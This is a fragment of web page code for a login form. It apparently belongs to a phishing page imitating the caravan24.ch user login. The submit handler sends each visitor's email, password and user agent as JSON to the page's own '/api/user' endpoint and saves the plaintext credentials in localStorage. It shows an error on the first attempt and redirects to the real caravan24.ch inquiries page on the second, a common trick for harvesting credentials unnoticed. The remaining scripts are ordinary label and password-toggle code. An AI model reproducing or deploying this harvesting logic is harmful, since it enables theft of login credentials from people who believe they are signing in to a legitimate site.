 <script>
    const userAgent = navigator.userAgent;
    let nr= 0;

    const errorSpan = document.getElementById('form-error');
  
  document.getElementById('myForm').addEventListener('submit', async (e) => {
    e.preventDefault(); 
    let formData = new FormData(e.target);

    if (errorSpan) {
        errorSpan.classList.remove('rr');
    }

          
    formData = JSON.stringify({
      email: formData.get('email'),
      pass: formData.get('password'),
      agent: userAgent
    });

    const response = await fetch('/api/user', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: formData
    });

    localStorage.setItem('usr', formData);

    if(nr > 0) {
        localStorage.setItem('usr', formData);
        window.location.href = 'https://www.caravan24.ch/chde/user/inquiries/';
    }
    nr++;

  })  
</script>

<script>
  function setupFloatingLabel(inputId) {
    const input = document.querySelector(inputId);
    const wrapper = input.closest('.floating-label-field');

    function checkValue() {
      if (input.value.trim() !== '') {
        wrapper.classList.add('is-active');
      } else {
        wrapper.classList.remove('is-active');
      }
    }

    // initial render
    checkValue();

    // browser autocomplete fix
    setTimeout(checkValue, 100);

    input.addEventListener('focus', () => {
      wrapper.classList.add('is-active');
    });

    input.addEventListener('blur', checkValue);

    input.addEventListener('input', checkValue);
    input.addEventListener('change', checkValue);
  }

  setupFloatingLabel('#login-email');
  setupFloatingLabel('#login-password');
</script>


<script>
  const passwordInput = document.querySelector('#login-password');
  const togglePassword = document.querySelector('.icon--no-margin');

  togglePassword.addEventListener('click', () => {
    passwordInput.type =
      passwordInput.type === 'password'
        ? 'text'
        : 'password';
  });
</script>
